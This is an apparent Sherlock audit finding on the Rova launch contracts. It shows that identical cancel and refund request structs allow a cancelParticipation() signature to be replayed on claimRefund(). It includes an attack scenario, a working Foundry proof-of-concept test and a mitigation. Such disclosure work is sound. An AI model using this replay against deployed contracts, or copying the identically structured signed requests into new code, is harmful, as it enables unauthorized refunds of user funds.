Cheerful Lemon Leopard

Medium

# Signature reuse possible between cancelParticipation() and claimRefund()

## Description
The structs for `CancelParticipationRequest` and `ClaimRefundRequest` [are identical](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Types.sol#L108-L134):
```js
    struct CancelParticipationRequest {
        uint256 chainId;
        bytes32 launchId;
        bytes32 launchGroupId;
        bytes32 launchParticipationId;
        bytes32 userId;
        address userAddress;
        uint256 requestExpiresAt;
    }

    struct ClaimRefundRequest {
        uint256 chainId;
        bytes32 launchId;
        bytes32 launchGroupId;
        bytes32 launchParticipationId;
        bytes32 userId;
        address userAddress;
        uint256 requestExpiresAt;
    }
```

This can lead to the following scenario:
1. User gets signature approved from backend for `cancelParticipation()`
2. However, the user does not call the function at this point of time
3. After some time, `OPERATOR_ROLE` calls `finalizeWinners()` with list of winners. User is not one of the winners.
4. `MANAGER_ROLE` then calls `setLaunchGroupStatus()` to mark launchGroup as COMPLETED
5. User back-runs `setLaunchGroupStatus()` and calls `claimRefund()`. User is able to call `claimRefund()` as its [modifier check](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L478) will pass which validates that status is `LaunchGroupStatus.COMPLETED`. The user's approved signature from `cancelParticipation()` can be used here due to the structs being identical. User gets their `currencyAmount` refunded.

Constraint to the attack: the additional condition capable of making this attack infeasible is if the `cancelParticipation()` signature approved by the backend has a `requestExpiresAt` value smaller than the `block.timestamp` of `setLaunchGroupStatus()` being called.

## Impact
Signature reuse across functions/intended actions.

## Proof of Concept
Add this file as `test/SignatureReuse.t.sol` and run to see it pass:
```js
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.22;

import {PausableUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol";
import {Test} from "forge-std/Test.sol";
import {LaunchTestBase, IERC20Events} from "./LaunchTestBase.t.sol";
import {Launch} from "../src/Launch.sol";
import {
    LaunchGroupSettings,
    LaunchGroupStatus,
    ParticipationRequest,
    CancelParticipationRequest,
    ClaimRefundRequest,
    ParticipationInfo
} from "../src/Types.sol";

contract SignatureReuse is Test, Launch, LaunchTestBase, IERC20Events {
    LaunchGroupSettings public settings;

    function setUp() public {
        _setUpLaunch();

        // Setup initial participation
        settings = _setupLaunchGroup();
        ParticipationRequest memory request = _createParticipationRequest();
        bytes memory signature = _signRequest(abi.encode(request));

        vm.startPrank(user1);
        currency.approve(
            address(launch), _getCurrencyAmount(request.launchGroupId, request.currency, request.tokenAmount)
        );
        launch.participate(request, signature);

        vm.stopPrank();
    }

    function test_SignatureReuseAttack() public {
        // User gets valid signature for cancelParticipation (but doesn't use it yet)
        CancelParticipationRequest memory cancelRequest = _createCancelParticipationRequest();
        bytes memory cancelSignature = _signRequest(abi.encode(cancelRequest));

        vm.startPrank(manager);
        launch.setLaunchGroupStatus(testLaunchGroupId, LaunchGroupStatus.COMPLETED);
        vm.stopPrank();

        // User back-runs setLaunchGroupStatus() by reusing cancelParticipation signature for claimRefund
        vm.startPrank(user1);
        // Create claim refund request with same parameters as cancel request
        ClaimRefundRequest memory claimRequest = ClaimRefundRequest({
            chainId: cancelRequest.chainId,
            launchId: cancelRequest.launchId,
            launchGroupId: cancelRequest.launchGroupId,
            launchParticipationId: cancelRequest.launchParticipationId,
            userId: cancelRequest.userId,
            userAddress: cancelRequest.userAddress,
            requestExpiresAt: cancelRequest.requestExpiresAt
        });

        // Use the cancel signature for claim request
        launch.claimRefund(claimRequest, cancelSignature);
        vm.stopPrank();
    }
}
```

## Mitigation
Include some unique field inside either of the structs so that the signature generated by `keccak256(abi.encode(request))` is unique and not inter-transferable.